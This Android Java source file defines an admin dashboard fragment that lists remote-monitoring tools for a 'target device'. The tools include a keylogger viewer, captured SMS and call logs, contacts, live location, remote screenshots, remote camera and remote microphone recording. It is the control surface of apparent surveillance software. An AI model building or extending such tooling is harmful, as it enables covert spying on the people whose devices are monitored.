package com.vikasyadavnsit.cdc.fragment;

import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.GridLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.utils.CommonUtil;

import java.util.function.Function;
import java.util.function.Supplier;

public class AdminViewersFragment extends Fragment {

    private static final String ARG_USER = "arg_user";
    private User userDetails;

    private static class ViewerTile {
        final String icon, title, description;
        final Function<User, Fragment> factory;
        final com.vikasyadavnsit.cdc.enums.ClickActionCategory category;

        ViewerTile(String icon, String title, String description, com.vikasyadavnsit.cdc.enums.ClickActionCategory category, Function<User, Fragment> factory) {
            this.icon = icon;
            this.title = title;
            this.description = description;
            this.category = category;
            this.factory = factory;
        }

        // Overload for fragments that don't need User data
        ViewerTile(String icon, String title, String description, com.vikasyadavnsit.cdc.enums.ClickActionCategory category, Supplier<Fragment> supplier) {
            this(icon, title, description, category, user -> supplier.get());
        }
    }

    private static final ViewerTile[] VIEWER_TILES = {
            new ViewerTile("📱", "Remote Actions",
                    "Send and manage automated click sequences or commands to the user's device",
                    null, RemoteTriggerClickActionsFragment::new),
            new ViewerTile("✉", "Set Message",
                    "Send a personalized message to be displayed on the user's device",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.SYSTEM, AdminMessageFragment::newInstance),
            new ViewerTile("💬", "SMS Logs",
                    "Browse all captured incoming and outgoing SMS messages",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.SMS, AdminSmsFragment::new),
            new ViewerTile("📞", "Call Logs",
                    "View all incoming, outgoing, and missed call records",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.CALLS, AdminCallLogsFragment::new),
            new ViewerTile("👥", "Contacts",
                    "See the complete contact list saved on the remote device",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.CONTACTS, AdminContactsFragment::new),
            new ViewerTile("📡", "Sensor Data",
                    "Live view of device sensors like Accelerometer, GPS, and Battery",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.DIAGNOSTICS, AdminSensorsFragment::new),
            new ViewerTile("🗂", "Files",
                    "Explore the directory structure and storage of the target device",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.STORAGE, AdminFileStructureFragment::new),
            new ViewerTile("⌨", "Key Logger",
                    "View a history of typed text and keyboard inputs organized by app",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.SECURITY, KeyStrokesFragment::new),
            new ViewerTile("🔔", "Notifications & Alerts",
                    "Monitor real-time system notifications and send remote alerts to the target device",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.NOTIFICATIONS, user -> new AdminNotificationContainerFragment()),
            new ViewerTile("📊", "Usage & Apps",
                    "Comprehensive report on app usage time, installed applications, and device screen state events",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.APPS, user -> new UsageViewerFragment()),
            new ViewerTile("🔌", "Offline Tester",
                    "Test and run action protocols locally on this device for debugging",
                    null, OfflineClickActionsFragment::new),
            new ViewerTile("📍", "Live Location",
                    "View the device's real-time GPS location on a map",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.LOCATION, LiveLocationFragment::new),
            new ViewerTile("🛡️", "VPN Control",
                    "Manage network traffic, restrict specific apps or websites and monitor connections",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.CONNECTIVITY, AdminVpnFragment::new),
            new ViewerTile("📸", "Screenshots",
                    "Remotely capture the device screen and view screenshots in real-time",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.SCREEN, AdminScreenshotFragment::new),
            new ViewerTile("📷", "Remote Camera",
                    "Take photos from front/back cameras and view live feed",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.CAMERA, AdminCameraFragment::new),
            new ViewerTile("🎙️", "Remote Mic",
                    "Record audio from the device and listen back in real-time",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.MICROPHONE, AdminMicFragment::new),
            new ViewerTile("📟", "Device Info",
                    "Live dashboard: WiFi, Bluetooth, SIM, battery, storage, and system info with remote controls",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.DIAGNOSTICS, AdminDeviceInfoFragment::new),
            new ViewerTile("📜", "Remote Logs",
                    "View and filter system-level logs pushed from the target device for remote debugging",
                    com.vikasyadavnsit.cdc.enums.ClickActionCategory.DIAGNOSTICS, AdminRemoteLogsFragment::new),
    };

    public static AdminViewersFragment newInstance(User userDetails) {
        AdminViewersFragment fragment = new AdminViewersFragment();
        Bundle args = new Bundle();
        args.putSerializable(ARG_USER, userDetails);
        fragment.setArguments(args);
        return fragment;
    }

    private void setupHeaderField(View root, int viewId, Object value) {
        TextView textView = root.findViewById(viewId);
        if (textView != null) {
            textView.setText(value != null ? value.toString() : "Unknown");
        }
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater,
                             @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        if (getArguments() != null) {
            userDetails = (User) getArguments().getSerializable(ARG_USER);
        }

        View view = inflater.inflate(R.layout.fragment_admin_viewers, container, false);

        setupHeaderField(view, R.id.admin_viewers_device_manufacturer, userDetails.getDeviceDetails().get("manufacturer"));
        setupHeaderField(view, R.id.admin_viewers_device_brand, userDetails.getDeviceDetails().get("brand"));
        setupHeaderField(view, R.id.admin_viewers_device_owner, userDetails.getFullName());
        setupHeaderField(view, R.id.admin_viewers_device_id, userDetails.getDeviceDetails().get("androidId"));

        GridLayout adminGrid = view.findViewById(R.id.admin_viewers_grid);
        adminGrid.setColumnCount(calculateNoOfColumns());
        for (ViewerTile tile : VIEWER_TILES) {
            if (tile.category != null && !com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.isCategoryEnabled(requireContext(), tile.category.name())) {
                continue;
            }
            adminGrid.addView(buildViewerTile(tile));
        }

        return view;
    }

    // ── Admin viewer tiles ────────────────────────────────

    private View buildViewerTile(ViewerTile viewer) {
        View tileView = LayoutInflater.from(getContext()).inflate(R.layout.item_admin_viewer_tile, null);
        tileView.setLayoutParams(createGroupLayoutParams());

        TextView iconView = tileView.findViewById(R.id.tile_icon);
        TextView titleView = tileView.findViewById(R.id.tile_title);
        TextView descView = tileView.findViewById(R.id.tile_description);
        Button openBtn = tileView.findViewById(R.id.btn_open);

        iconView.setText(viewer.icon);
        titleView.setText(viewer.title);
        descView.setText(viewer.description);
        
        openBtn.setOnClickListener(v ->
                CommonUtil.loadFragmentWithBackStack(getParentFragmentManager(), viewer.factory.apply(userDetails)));

        return tileView;
    }

    // ── Helpers ───────────────────────────────────────────

    private int calculateNoOfColumns() {
        DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
        float dpWidth = displayMetrics.widthPixels / displayMetrics.density;
        int noOfColumns = (int) (dpWidth / 350); // Slightly wider cards
        return Math.max(1, Math.min(noOfColumns, 2)); // 1 col on mobile, 2 on tablet
    }

    private GridLayout.LayoutParams createGroupLayoutParams() {
        GridLayout.LayoutParams p = new GridLayout.LayoutParams();
        p.width = 0;
        p.height = GridLayout.LayoutParams.WRAP_CONTENT;
        p.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
        p.setMargins(dp(8), dp(8), dp(8), dp(8));
        return p;
    }

    private int dp(int value) {
        return (int) (value * getResources().getDisplayMetrics().density);
    }
}
